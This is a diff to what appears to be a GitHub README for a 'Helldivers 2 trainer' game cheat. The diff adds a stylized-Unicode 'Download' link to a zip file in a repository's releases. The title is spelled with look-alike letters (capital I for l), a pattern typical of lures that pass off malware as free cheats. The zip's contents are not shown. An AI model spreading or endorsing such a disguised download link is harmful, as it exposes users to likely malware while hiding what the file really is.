@@ -1,6 +1,6 @@
 # HeIIDivers 2 New TRAlNER
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/gojo12323/HeIIDivers-2-New-TRAlNER/releases/download/HeIIDivers/HeIIDivers-2-New-TRAlNER.zip)
 
 • Super Health
 
